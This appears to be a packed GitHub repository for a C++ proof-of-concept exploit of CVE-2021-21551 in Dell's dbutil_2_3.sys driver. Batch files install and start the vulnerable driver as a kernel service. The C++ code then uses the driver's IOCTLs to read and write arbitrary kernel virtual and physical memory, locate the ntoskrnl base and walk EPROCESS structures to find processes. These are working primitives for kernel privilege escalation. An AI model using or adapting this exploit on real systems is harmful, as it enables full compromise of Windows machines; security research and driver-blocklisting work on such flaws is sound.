Project Path: arc_gmh5225_CVE-2021-21551-POC__pbbonc6

Source Tree:

```txt
arc_gmh5225_CVE-2021-21551-POC__pbbonc6
├── DbUtilAx.sln
├── DbUtilAx.vcxproj
├── DbUtilAx.vcxproj.filters
├── DbUtilAx.vcxproj.user
├── README.md
├── driver
│   ├── createservice.bat
│   ├── dbutil_2_3.sys
│   ├── dbutil_2_3.sys.i64
│   ├── startservice.bat
│   └── stopservice.bat
├── logger.cpp
├── logger.h
├── main.cpp
├── memory.cpp
├── memory.h
├── nt.h
└── stdafx.h

```

`DbUtilAx.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31205.134
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DbUtilAx", "DbUtilAx.vcxproj", "{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Debug|x64.ActiveCfg = Debug|x64
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Debug|x64.Build.0 = Debug|x64
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Debug|x86.ActiveCfg = Debug|Win32
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Debug|x86.Build.0 = Debug|Win32
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Release|x64.ActiveCfg = Release|x64
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Release|x64.Build.0 = Release|x64
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Release|x86.ActiveCfg = Release|Win32
		{F7712C01-C42D-4DA4-AFE7-61A1FE70DAC2}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {02A72349-EA98-434C-B060-116C4DEF4BB7}
	EndGlobalSection
EndGlobal

```

`DbUtilAx.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{f7712c01-c42d-4da4-afe7-61a1fe70dac2}</ProjectGuid>
    <RootNamespace>DbUtilAx</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <LibraryPath>$(LibraryPath)</LibraryPath>
    <IncludePath>C:\Users\mzako\Documents\GitHub\DbUtilAx\includes;$(IncludePath)</IncludePath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <AdditionalIncludeDirectories>
      </AdditionalIncludeDirectories>
      <AdditionalOptions>/Zc:strictStrings- %(AdditionalOptions)</AdditionalOptions>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="logger.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="memory.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="nt.h" />
    <ClInclude Include="logger.h" />
    <ClInclude Include="memory.h" />
    <ClInclude Include="stdafx.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DbUtilAx.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="logger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="logger.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="nt.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`DbUtilAx.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`README.md`:

```md
# DbUtilAx
An extended proof-of-concept for the CVE-2021-21551 Dell ‘dbutil_2_3.sys’ Kernel Exploit.

Read the full blog post [here](https://mitchellzakocs.com/blog/dbutil).
```

`driver/createservice.bat`:

```bat
sc create dbutil2 binPath= "C:\Users\mzako\Documents\GitHub\DbUtilAx\driver\dbutil_2_3.sys" type= kernel
PAUSE
```

`driver/startservice.bat`:

```bat
sc start dbutil2
PAUSE

```

`driver/stopservice.bat`:

```bat
sc stop dbutil2
::sc delete dbutil
PAUSE
```

`logger.cpp`:

```cpp
#include "stdafx.h"

void Logger::Info(std::string InfoMessage) {
	// Logs an info message
	std::cout << "[+] " << InfoMessage << std::endl;
}

void Logger::Error(std::string ErrorMessage) {
	// Logs an error message
	std::cerr << "[x] " << ErrorMessage << std::endl;
}

void Logger::InfoHex(std::string InfoMessage, DWORD64 Number) {
	// Logs an info message : hex
	std::cout << "[+] " << InfoMessage << ": 0x" << std::hex << Number << std::endl;
}

void Logger::ShowKeyPress() {
	// Press any key to continue...
	// Pauses the console
	system("PAUSE");
}
```

`logger.h`:

```h
#pragma once

#include "stdafx.h"

class Logger {
public:

	// Log an info string to console
	static void Info(std::string InfoMessage);

	// Log an error string to console
	static void Error(std::string ErrorMessage);

	// Log an info string and a hex value to console
	static void InfoHex(std::string InfoMessage, DWORD64 Number);

	// Equivalent to PAUSE in batch scripting
	static void ShowKeyPress();
}; 
```

`main.cpp`:

```cpp
#include "stdafx.h"

int main(int argc, char *argv[]) {

	BOOL success = true;

	// Initialize the Memory Manager object
	Memory* MemoryManager = new Memory();
	
	// Tests getting the base address of ntoskrnl.exe
	DWORD64 ntoskrnlBaseAddress = MemoryManager->GetKernelBase("ntoskrnl.exe");

	// Tests grabbing an EPROCESS struct of a process
	std::string processName = "explorer.exe";
	DWORD64 peprocess = MemoryManager->GetEPROCESSPointer(ntoskrnlBaseAddress, processName);
	if (peprocess == NULL) {
		Logger::Info("Failed to get EPROCESS of process!");
		Logger::ShowKeyPress();
		exit(1);
	}
	Logger::InfoHex("EPROCESS Address", peprocess);

	// Tests reading a value from the EPROCESS struct
	DWORD64 tableBase{};
	MemoryManager->VirtualRead(peprocess + EPROCESS_DIRECTORYTABLEBASE, &tableBase, sizeof(DWORD64));
	Logger::InfoHex("Table Base Address", tableBase);

	// Tests physical reads at address 0
	DWORD64 testPhysAddress{ 0 };
	DWORD64 testPhysRead{};
	MemoryManager->PhysicalRead(tableBase, &testPhysRead, sizeof(DWORD64));
	Logger::InfoHex("Test Phys Read", testPhysRead);

	// Pause to see info, lets me launch the exe outside the terminal
	Logger::ShowKeyPress();

}
```

`memory.cpp`:

```cpp
#include "stdafx.h"

Memory::Memory() {
	/* Constructor for Memory Manager */
	// Opens a handle to dbutil_2_3
	Memory::DriverHandle = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	// Checks if handle was opened succesfully
	if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
		Logger::Error("Couldn't Create Handle to Driver, Quitting...");
		Logger::ShowKeyPress();
		exit(1);
	}
	else {
		Logger::Info("Successfully Created Handle to Driver!");
	}
}

BOOL Memory::VirtualRead(_In_ DWORD64 address, _Out_ void *buffer, _In_ size_t bytesToRead) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, 0x8);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, 0x8);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, 0x8);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_VIRTUAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x18], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::VirtualWrite(_In_ DWORD64 address, _In_ void *buffer, _In_ size_t bytesToWrite) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x18], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_VIRTUAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::PhysicalRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_PHYSICAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x10], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x10], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_PHYSICAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

DWORD64 Memory::GetKernelBase(_In_ std::string name) {
	/* Gets the base address (VIRTUAL ADDRESS) of a module in kernel address space */
	// Defining EnumDeviceDrivers() and GetDeviceDriverBaseNameA() parameters
	LPVOID lpImageBase[1024]{};
	DWORD lpcbNeeded{};
	int drivers{};
	char lpFileName[1024]{};
	DWORD64 imageBase{};
	// Grabs an array of all of the device drivers
	BOOL success = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);
	// Makes sure that we successfully grabbed the drivers
	if (!success)
	{
		Logger::Error("Unable to invoke EnumDeviceDrivers()!");
		return 0;
	}
	// Defining number of drivers for GetDeviceDriverBaseNameA()
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);
	// Parsing loaded drivers
	for (int i = 0; i < drivers; i++) {
		// Gets the name of the driver
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);
		// Compares the indexed driver and with our specified driver name
		if (!strcmp(name.c_str(), lpFileName)) {
			imageBase = (DWORD64)lpImageBase[i];
			Logger::InfoHex("Found Image Base for " + name, imageBase);
			break;
		}
	}
	return imageBase;
}

DWORD64 Memory::GetEPROCESSPointer(_In_ DWORD64 ntoskrnlBase, _In_ std::string processName) {
	/* Returns the pointer (VIRTUAL ADDRESS) to an EPROCESS struct for a specified process name*/
	// Gets PsInitialSystemProcess address from ntoskrnl exports
	// Maps the ntoskrnl file to memory
	HANDLE handleToFile = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE handleToMap = CreateFileMapping(handleToFile, NULL, PAGE_READONLY, 0, 0, NULL);
	PBYTE srcFile = (PBYTE)MapViewOfFile(handleToMap, FILE_MAP_READ, 0, 0, 0);
	if (!srcFile) {
		Logger::Error("Failed to open ntoskrnl!");
		return NULL;
	}
	// Gets the DOS header from the file map
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)srcFile;
	// Gets the NT header from the dos header
	IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64 *)((PBYTE)dosHeader + dosHeader->e_lfanew);
	// Gets the Exports data directory information
	IMAGE_DATA_DIRECTORY* exportDirInfo = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// Gets the first section data header to start iterating through
	IMAGE_SECTION_HEADER* firstSectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	// Loops Through Each Section to find export table
	DWORD64 PsIntialSystemProcessOffset{};
	for (DWORD i{}; i < ntHeader->FileHeader.NumberOfSections; i++) {
		auto section = &firstSectionHeader[i];
		// Checks if our export address table is within the given section
		if (section->VirtualAddress <= exportDirInfo->VirtualAddress && exportDirInfo->VirtualAddress < (section->VirtualAddress + section->Misc.VirtualSize)) {
			// If so, put the export data in our variable and exit the for loop
			IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)dosHeader + section->PointerToRawData + (DWORD64)exportDirInfo->VirtualAddress - section->VirtualAddress);
			// Iterates through the names to find the PsInitialSystemProcess export
			DWORD* funcNames = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfNames + section->PointerToRawData - section->VirtualAddress);
			DWORD* funcAddresses = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfFunctions + section->PointerToRawData - section->VirtualAddress);
			WORD* funcOrdinals = (WORD*)((PBYTE)srcFile + exportDirectory->AddressOfNameOrdinals + section->PointerToRawData - section->VirtualAddress);
			for (DWORD j{}; j < exportDirectory->NumberOfNames; j++) {
				LPCSTR name = (LPCSTR)(srcFile + funcNames[j] + section->PointerToRawData - section->VirtualAddress);
				if (!strcmp(name, "PsInitialSystemProcess")) {
					PsIntialSystemProcessOffset = funcAddresses[funcOrdinals[j]];
					break;
				}
			}
			break;
		}
	}
	// Checks if we found the offset
	if (!PsIntialSystemProcessOffset) {
		Logger::Error("Failed to find PsInitialSystemProcess offset!");
		return NULL;
	}
	// Reads the PsInitialSystemProcess Address
	DWORD64 initialSystemProcess{};
	this->VirtualRead(ntoskrnlBase + PsIntialSystemProcessOffset, &initialSystemProcess, sizeof(DWORD64));
	if (!initialSystemProcess) {
		Logger::Error("Failed to VirtualRead PsInitialSystemProcess offset!");
		return NULL;
	}
	// Reads ActiveProcessLinks of the system process to iterate through all processes
	LIST_ENTRY activeProcessLinks;
	this->VirtualRead(initialSystemProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
	// Prepares input string for search algorithm below
	const char* inputName = processName.c_str();
	// Sets up a current process tracker as we iterate through all of the processes
	DWORD64 currentProcess{};
	UCHAR currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// Loops through the process list three times to find the PID we're looking for
	for (DWORD i{}; i < 3; i++) {
		do {
			// Initializes the currentProcess tracker with the process that comes after System
			this->VirtualRead((DWORD64)activeProcessLinks.Flink, &currentProcess, sizeof(DWORD64));
			// Subtracts the offset of the activeProcessLinks offset as an activeProcessLink
			// points to the activeProcessLinks of another EPROCESS struct
			currentProcess -= EPROCESS_ACTIVEPROCESSLINKS;
			// Gets the Name of currentProcess
			this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, sizeof(currentProcessName));
			// Checks if the currentProcess is the one we're looking for
			Logger::InfoHex((const char*)currentProcessName, strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE));
			if (strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
				// If it is the process, return the pointer to the EPROCESS struct
				return currentProcess;
			}
			// If not, update the activeProcessLinks entry with the list entry from currentprocess
			this->VirtualRead(currentProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
		} while (strncmp((const char*)currentProcessName, SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
	}
	// Will return NULL if the process is not found after 3 iterations
	return NULL;
}
```

`memory.h`:

```h
#pragma once

#include "stdafx.h"

// IOCTRL Codes for dbutil Driver Dispatch Methods
#define IOCTL_VIRTUAL_READ			0x9B0C1EC4
#define IOCTL_VIRTUAL_WRITE			0x9B0C1EC8
#define IOCTL_PHYSICAL_READ			0x9B0C1F40
#define IOCTL_PHYSICAL_WRITE		0x9B0C1F44

// Size of the parameters/header of each IOCTRL packet/buffer
#define VIRTUAL_PACKET_HEADER_SIZE	0x18
#define PHYSICAL_PACKET_HEADER_SIZE	0x10
#define PARAMETER_SIZE				0x8
#define GARBAGE_VALUE				0xDEADBEEF


class Memory {
public:
	HANDLE DriverHandle;

	Memory();

	// Virtual Kernel Memory Read Primitive
	BOOL VirtualRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);

	// Virtual Kernel Memory Write Primitive
	BOOL VirtualWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

	// Physical Memory Read Primitive
	BOOL PhysicalRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);

	// Physical Memory Write Primitive
	BOOL PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

	// Gets kernel base address for modules
	DWORD64 GetKernelBase(_In_ std::string name);

	// Gets pointer to a processes EPROCESS struct 
	DWORD64 GetEPROCESSPointer(_In_ DWORD64 ntoskrnlBase, _In_ std::string processName);
};
```

`nt.h`:

```h
#pragma once

// Generic Definitions
#define SYSTEM_PROCESSID 0x4
#define SYSTEM_NAME "System"

// EPROCESS Offsets
#define EPROCESS_PROCESSID 0x440
#define EPROCESS_ACTIVEPROCESSLINKS 0x448
#define EPROCESS_DIRECTORYTABLEBASE 0x28
#define EPROCESS_NAME 0x5A8
#define EPROCESS_MAX_NAME_SIZE 0xF
```

`stdafx.h`:

```h
#pragma once

// C++ Standard Libraries
#include <iostream>
#include <string>

// Native Windows Libraries
#include <Windows.h>
#include <psapi.h>
#include <winnt.h>

// Internal Headers
#include "logger.h"
#include "memory.h"
#include "nt.h"
```